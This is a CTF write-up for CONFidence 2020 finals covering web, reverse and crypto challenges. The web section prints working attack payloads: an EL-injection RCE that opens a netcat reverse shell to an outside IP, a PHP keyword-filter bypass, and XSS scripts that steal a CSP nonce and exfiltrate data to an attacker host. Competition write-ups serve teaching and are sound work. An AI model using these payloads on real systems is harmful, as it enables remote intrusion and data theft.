# CONFidence 2020 CTF Finals

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20200905-confidence2020ctffinals/) of this writeup.**


 - [CONFidence 2020 CTF Finals](#confidence-2020-ctf-finals)
   - [Web](#web)
     - [Password Manager](#password-manager)
     - [HAHA Jail](#haha-jail)
     - [Yet Another Cat Challenge](#yet-another-cat-challenge)
     - [Yet Another Yet Another Cat Challenge](#yet-another-yet-another-cat-challenge)
   - [Reverse](#reverse)
     - [Team Trees](#team-trees)
   - [Crypto](#crypto)
     - [FibHash](#fibhash)


## Web

### Password Manager

This blackbox challenge has only one input box. After some fuzzing @how2hack found the input `${7*7}` will return 49.

Based on `JSESSIONID`, we know this is a Java application. After some trial and error, we google the error message and find it's `Java Unified Expression Language`.

```
> ${context}

de.odysseus.el.util.SimpleContext@5bd317d3

```

[This articile](https://pulsesecurity.co.nz/articles/EL-Injection-WAF-Bypass) demos how to RCE through this template injection.

Here is the final RCE payload:

```
${true.getClass().forName("java.lang.Runtime").getMethods()[6].invoke(true.getClass().forName("java.lang.Runtime")).exec("busybox nc 133.221.333.123 1337 -e sh")}";

# p4{inside-jar-was-juel-who-blocked-my-classes-and-made-me-use-session-giving-me-depression}
```

### HAHA Jail

The server uses [hhvm](https://github.com/facebook/hhvm) to run the php sandbox. Here is a simple hello world sample:

```
<?hh
<<__EntryPoint>>
function main(): void {
echo 123;
}
```

The server also has a lots of keyword filter. For instance, the source code cannot contain `shell_exec`. However this is trivial to bypass as PHP is a pretty dynamic language.

```
<?hh                                                                                                                                     
<<__EntryPoint>>                                                                                                                         
function main(): void {
  echo call_user_func("shell_\x65xec","cat \x2fvar\x2fwww\x2f*lag* 1>&2");
}
```

Flag: `p4{h4x0riN9_7H3_H4ck}`

### Yet Another Cat Challenge

This is a XSS challenge and flag is in `/flag` (JSONP script endpoint). However, strict CSP is deployed:

```
default-src 'none'; form-action 'self'; frame-ancestors 'none'; style-src https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css; img-src 'self'; script-src 'nonce-GXj7n92IV_gjalKGExKGCg' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/; frame-src https://www.google.com/recaptcha/
```

So we cannot just `fecth("/flag")` and read the content. We have to somehow inject `<script src="/flag">` with valid nonce.

On one of the page, we have an XSS endpoint. The payload is inside `<script>` block so we don't have to worry about nonce.

We just retrieve the nonce through `document.querySelector("script").nonce;` and use `document.write` to load the flag.

The attack steps:

1. Redirect admin to our page using `</script><meta http-equiv="refresh" content=...`
2. Redirect admin to the DOM XSS page `note/UUID?theme=XSS_PAYLOAD`
3. Retrieve the nonce and load the flag
4. Javascript redirection `location=` the exfiltrate the flag

```python
#!/usr/bin/env python3
import requests
from base64 import b64encode
from urllib.parse import quote
def replace(x):
    for old, new in [
        ('"', '\\x22'),
        ('<', '\\x3c'),
        ('>', '\\x3e'),
        ('\n', ''),
        ]:
        x = x.replace(old, new)
    return x
payload = quote(replace('''
nonce=document.querySelector(`script`).nonce;
document.write(`<script nonce="${nonce}" src="/flag?var=flag"></script>
<script nonce="${nonce}">location="//133.221.333.123:1337/flag.html?"+btoa(flag)</script>`);
'''))
redirect_url = 'http://yacc.zajebistyc.tf/note/b02e8d7d-be2a-455d-8eeb-2d0db6194a95?theme=' + payload
print(redirect_url)

# cat type payload
print(f'</script><meta http-equiv="refresh" content="0;url=http://133.221.333.123:1337" />'.replace('"', '&quot;'))
# index.html
f'''
location = '{redirect_url}'
'''
```

Flag: `p4{you_painted_it_yourself!}`

This is apparently an unintended solution. Another unintended solution is using `window.open`. See [@terjanq's payload](https://gist.github.com/terjanq/a50aa6a3b78fbc4350e5a14e2ff0a7d8) for details. Both solution does not exploit through the flag JSONP API.

The intended solution, according to XeR, is using BMP to leak the pixels, as the CSP allows to include images from `self`.

```
http://yayacc.zajebistyc.tf/flag?var=%42%4D%50%00%00%00%00%00%00%00%20%00%00%00%0C%00%00%00%08%00%0A%00%01%00%01%00%FF%FF%FF%00%00%00
```

And use `<img>` to load the flag and leak it.

### Yet Another Yet Another Cat Challenge

This is a fixed version of the previous challenge by removing the script element `document.scripts[0].remove()`. We can no longer retrieve the nonce.

However, violating CSP will fire an event [SecurityPolicyViolationEvent](https://developer.mozilla.org/en-US/docs/Web/API/SecurityPolicyViolationEvent), which can be useful to retrieve the nonce.

The attack steps are exactly the same as the previous challenge.

```python
#!/usr/bin/env python3
import requests
from base64 import b64encode
from urllib.parse import quote
def replace(x):
    for old, new in [
        ('"', '\\x22'),
        ('<', '\\x3c'),
        ('>', '\\x3e'),
        ('\n', ''),
        ]:
        x = x.replace(old, new)
    return x
payload = quote(replace('''
document.addEventListener(`securitypolicyviolation`, function (e) {
  nonce=e.originalPolicy.substring(182, 204);
  document.write(`<script nonce="${nonce}" src="/flag?var=flag"></script><script nonce="${nonce}">location="//133.221.333.123:1337/flag222.html?"+btoa(flag)</script>`);
});
fetch(`foo`)
'''))
redirect_url = 'http://yayacc.zajebistyc.tf/note/6fadeb7c-b5cc-426c-b7dc-92a7cba5fdd7?theme=' + payload
print(redirect_url)

# cat type payload
print(f'</script><meta http-equiv="refresh" content="0;url=http://133.221.333.123:1337" />'.replace('"', '&quot;'))
# index.html
f'''
location = '{redirect_url}'
'''
```

Flag: `p4{can_you_draw_with_a_cat?}`

For the intended solution, please refer to the previous challenge's write-up.

## Reverse

### Team Trees

```python
# sage ./flag.sage

# p4{62246322232ceabf0bf1d9826c054007}

'''
loop:
    lea     rdx, [rdx+rdx*2]
    lea     rdx, [rdx+rcx*2+4]
    xchg    rcx, rdx
    jmp     loop


x' = y
y' = 3x + 2y + 4

[ x , y , 1 ]

[ 0 , 3 , 0 ]
[ 1 , 2 , 0 ]
[ 0 , 4 , 1 ]
'''


K = Zmod(2^64)

A = Matrix(K, [
    [ 0x82F96AC97429A68B, 0x32B9B6BCA55548ED, 1]
])

N = Matrix(K, [
    [ 0, 3, 0],
    [ 1, 2, 0],
    [ 0, 4, 1],
])

assert N^(2^64) == identity_matrix(3)


dp = [0] * 1338
dp[0] = 1
dp[1] = 3
dp[2] = 5
dp[3] = 15

K = Zmod(2^66)
dp = [K(e) for e in dp]

for i in range( 1338 ):
    if dp[i]:
        continue

    dp[i] = dp[i-1] + dp[i-2] ** 2 + dp[i-3] ** 3
    #print(i, dp[i])

n = dp[1337]
e = ZZ(n) // 4

print( 'n =' , n )
print( 'n / 4 =' , e )
print( 'n % 4 =' , n % 4 ) # 1

ans = A*N^e
print( 'A * N^e =' , ans)

rdx = ans[0,0]
rcx = ans[0,1]

rdx = rdx + rdx * 2

print( 'p4{%016x%016x}' % ( rcx , rdx )  )
```

## Crypto

### FibHash

Given a big prime $p$, indicates all scalar arithmetic will be performed under modulo $p$.
Given four matrices $A_0$..$A_3$, and four vectors $x_0$..$x_3$.
Given $A_i^nx_i[0]$, find $n$.

First, observe the eigen values of each matrix.
Eigen value of $A_0$ is a multiple root $3$, and $A_0$ is not diagnalizable.
Eigen values of $A_1$, $A_2$, and $A_3$ are $(3, 5)$, $(5, 7)$ and $(3, 7)$, respectively.

By diagnalizing $A_1$, $A_2$, $A_3$ and solving simultaneous equations, we can calculate $3^n$, $5^n$, and $7^n$.
Note that $A_0^n =\begin{matrix}
|&3^n\times n+3^n&-3^n\times n&| \\
|&3^{n-1}\times n&-3^n\times n+3^n&|
\end{matrix}$
Since $3^n$ is calculated before, one can easily find $n$.
